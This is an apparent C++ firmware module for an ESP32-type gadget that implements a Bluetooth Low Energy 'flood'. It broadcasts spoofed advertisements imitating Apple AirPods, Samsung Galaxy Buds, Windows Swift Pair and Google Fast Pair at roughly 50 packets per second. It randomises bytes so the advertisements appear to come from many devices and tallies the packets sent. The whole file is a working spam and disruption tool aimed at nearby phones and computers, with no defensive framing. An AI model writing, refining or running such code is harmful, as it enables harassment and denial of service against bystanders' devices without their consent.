#include "ble_flood.h"
#include "core/display.h"
#include <NimBLEDevice.h>

static bool _is_active = false;
static uint32_t _packets_sent = 0;
static BLEFloodMode _current_mode = BLE_FLOOD_ALL;
static unsigned long _last_update = 0;
static NimBLEAdvertising* _pAdvertising = nullptr;

// Payloads de diferentes dispositivos
// Apple AirPods Pro (manufacturer data)
static const uint8_t APPLE_AIRPODS[] = {
    0x4C, 0x00,  // Apple Company ID
    0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30,
    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00
};

// Samsung Galaxy Buds (manufacturer data)
static const uint8_t SAMSUNG_BUDS[] = {
    0x75, 0x00,  // Samsung Company ID
    0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21,
    0x01, 0x09, 0xEF, 0xA6, 0x12, 0xEA, 0x00, 0x00
};

// Windows Swift Pair (manufacturer data)
static const uint8_t WINDOWS_SWIFTPAIR[] = {
    0x06, 0x00,  // Microsoft Company ID
    0x03, 0x00, 0x80,  // Swift Pair beacon
    0x00, 0x00, 0x00
};

// Google Fast Pair (manufacturer data)
static const uint8_t GOOGLE_FASTPAIR[] = {
    0xE0, 0x00,  // Google Company ID (placeholder)
    0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00
};

void ble_flood_init() {
    _is_active = false;
    _packets_sent = 0;

    // Inicializa BLE se necessário
    NimBLEDevice::init("Lele");
    _pAdvertising = NimBLEDevice::getAdvertising();
}

bool ble_flood_start(BLEFloodMode mode) {
    if (_is_active) return false;

    _current_mode = mode;
    _is_active = true;
    _packets_sent = 0;

    const char* mode_names[] = {"Apple", "Android", "Samsung", "Windows", "TODOS"};
    String msg = "BLE Flood: " + String(mode_names[mode]);
    displayInfo(msg, false);

    return true;
}

void ble_flood_stop() {
    _is_active = false;

    if (_pAdvertising) {
        _pAdvertising->stop();
    }

    String msg = "BLE Flood parado\n" + String(_packets_sent) + " pacotes";
    displaySuccess(msg, true);
}

int ble_flood_update() {
    if (!_is_active || !_pAdvertising) return 0;

    unsigned long now = millis();
    if (now - _last_update < 20) return 0;  // ~50 pps
    _last_update = now;

    // Seleciona payload baseado no modo
    const uint8_t* payload = nullptr;
    size_t payload_len = 0;

    int mode_to_send = _current_mode;
    if (_current_mode == BLE_FLOOD_ALL) {
        mode_to_send = random(0, 4);  // Alterna entre todos
    }

    switch (mode_to_send) {
        case BLE_FLOOD_APPLE:
            payload = APPLE_AIRPODS;
            payload_len = sizeof(APPLE_AIRPODS);
            break;
        case BLE_FLOOD_ANDROID:
            payload = GOOGLE_FASTPAIR;
            payload_len = sizeof(GOOGLE_FASTPAIR);
            break;
        case BLE_FLOOD_SAMSUNG:
            payload = SAMSUNG_BUDS;
            payload_len = sizeof(SAMSUNG_BUDS);
            break;
        case BLE_FLOOD_WINDOWS:
            payload = WINDOWS_SWIFTPAIR;
            payload_len = sizeof(WINDOWS_SWIFTPAIR);
            break;
    }

    if (payload && payload_len > 0) {
        // Cria cópia modificada do payload
        uint8_t modified_payload[32];
        size_t copy_len = min(payload_len, sizeof(modified_payload));
        memcpy(modified_payload, payload, copy_len);

        // Randomiza alguns bytes para parecer dispositivos diferentes
        if (copy_len > 5) {
            modified_payload[copy_len - 1] = random(0, 256);
            modified_payload[copy_len - 2] = random(0, 256);
        }

        // Configura advertisement com manufacturer data
        NimBLEAdvertisementData advData;

        // Usa vetor para addData
        std::vector<uint8_t> dataVec(modified_payload, modified_payload + copy_len);
        advData.addData(dataVec);

        _pAdvertising->setAdvertisementData(advData);
        _pAdvertising->start(0);

        delay(5);
        _pAdvertising->stop();

        _packets_sent++;
    }

    // Atualiza display periodicamente
    static unsigned long last_display = 0;
    if (now - last_display > 500) {
        last_display = now;
        tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
        tft.setCursor(10, tftHeight - 15);
        tft.printf("BLE Flood: %d pkts", _packets_sent);
    }

    return 1;
}

bool ble_flood_is_active() { return _is_active; }
uint32_t ble_flood_get_packets() { return _packets_sent; }
